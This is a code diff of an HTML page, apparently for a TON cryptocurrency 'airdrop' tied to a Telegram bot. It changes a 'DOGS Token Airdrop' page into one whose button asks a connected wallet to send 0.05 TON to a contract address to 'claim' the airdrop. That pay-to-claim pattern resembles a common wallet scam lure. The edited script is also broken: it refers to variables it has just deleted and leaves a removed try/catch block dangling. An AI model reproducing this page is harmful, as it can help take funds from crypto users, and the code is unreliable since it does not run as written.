@@ -1,83 +1,33 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DOGS Token Airdrop</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
-            margin: 0 auto;
-            padding: 20px;
-            text-align: center;
-        }
-        button {
-            padding: 10px 20px;
-            margin: 10px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        #status {
-            margin-top: 20px;
-            padding: 10px;
-            border-radius: 5px;
-        }
-        #wallet-container {
-            display: flex;
-            justify-content: center;
-            margin: 20px 0;
-            min-height: 45px;
-        }
-    </style>
+    <title>TON Connect Example</title>
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    <script src="https://unpkg.com/@tonconnect/sdk@0.0.34/dist/tonconnect-sdk.min.js"></script>
+
 </head>
+
 <body>
-    <h1>DOGS Token Airdrop</h1>
-    <div id="wallet-container"></div>
-    <button id="claimButton" style="display: none;">Claim Airdrop</button>
-    <div id="status"></div>
+    <div class="center" id="ton-connect"></div>
+    <button id="start-airdrop" style="">Rozpocznij Airdrop</button>
 
-    <script type="module">
-        import { TonConnectUI } from 'https://cdn.jsdelivr.net/npm/@tonconnect/ui@1.0.0-beta.6/dist/tonconnect-ui.esm.js';
-
-        // Konfiguracja TonConnect
-        const tonConnectUI = new TonConnectUI({
+    <script>
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
-            buttonRootId: 'wallet-container',
-            uiPreferences: {
-                theme: 'LIGHT',
-                borderRadius: 'M',
-            }
+            buttonRootId: 'ton-connect'
         });
+        tonConnectUI.uiOptions = {
+            twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
+        };
 
-        // Adres kontraktu
-        const AIRDROP_CONTRACT_ADDRESS = 'EQAj2hi6_JljnyupUJqqWduHyQ_74Uf23FcVQmdXy9KWVnQY';
-        
-        // Elementy DOM
-        const claimButton = document.getElementById('claimButton');
-        const statusDiv = document.getElementById('status');
+        const startAirdropButton = document.getElementById('start-airdrop');
 
-        // Nasłuchiwanie zmian statusu połączenia
-        tonConnectUI.onStatusChange(async (wallet) => {
-            console.log('Wallet status:', wallet); // Debug log
-            if (wallet) {
-                claimButton.style.display = 'block';
-                statusDiv.textContent = 'Connected: ' + wallet.account.address;
-            } else {
-                claimButton.style.display = 'none';
-                statusDiv.textContent = 'Please connect your wallet';
-            }
-        });
 
-        // Obsługa przycisku claim
-        claimButton.addEventListener('click', async () => {
-            try {
-                if (!tonConnectUI.connected) {
-                    statusDiv.textContent = 'Please connect your wallet first';
-                    return;
-                }
-
-                const transaction = {
+        startAirdropButton.addEventListener('click', async () => {
+            const transaction = {
                     to: AIRDROP_CONTRACT_ADDRESS,
                     value: '50000000', // 0.05 TON
                     payload: 'claim'
@@ -86,17 +36,11 @@
                 const result = await tonConnectUI.sendTransaction(transaction);
                 statusDiv.textContent = 'Transaction sent! Waiting for confirmation...';
                 console.log('Transaction result:', result); // Debug log
-                
-            } catch (error) {
-                console.error('Error claiming airdrop:', error);
-                statusDiv.textContent = 'Error: ' + error.message;
-            }
-        });
+            
 
-        // Debug logs
-        console.log('TonConnectUI initialized');
-        const walletConnectionStatus = await tonConnectUI.getConnectedWallet();
-        console.log('Initial wallet connection status:', walletConnectionStatus);
+
+        });
     </script>
 </body>
+
 </html>
